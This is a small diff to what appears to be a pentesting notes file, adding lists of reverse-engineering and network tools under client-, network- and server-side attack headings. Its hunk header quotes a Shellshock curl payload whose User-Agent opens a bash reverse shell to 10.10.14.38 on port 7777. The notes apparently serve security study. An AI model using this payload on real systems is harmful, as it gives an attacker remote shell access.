@@ -520,5 +520,21 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' 
 		* Process Monitor
 		* Strings
 * Client side attacks
+	* Tools:
+		* Ghidra
+		* IDA
+		* OllyDbg
+		* Radare2
+		* dnSpy
+		* x64dbg
+		* JADX
+		* Frida
 * Network side attacks
-* Server side a
+	* tools
+		* wireshark
+		* tcpdump
+		* TCPview
+		* Burp
+* Server side attacks
+	* owasp stuff
+* De4Dot can be used to reverse .NET executables
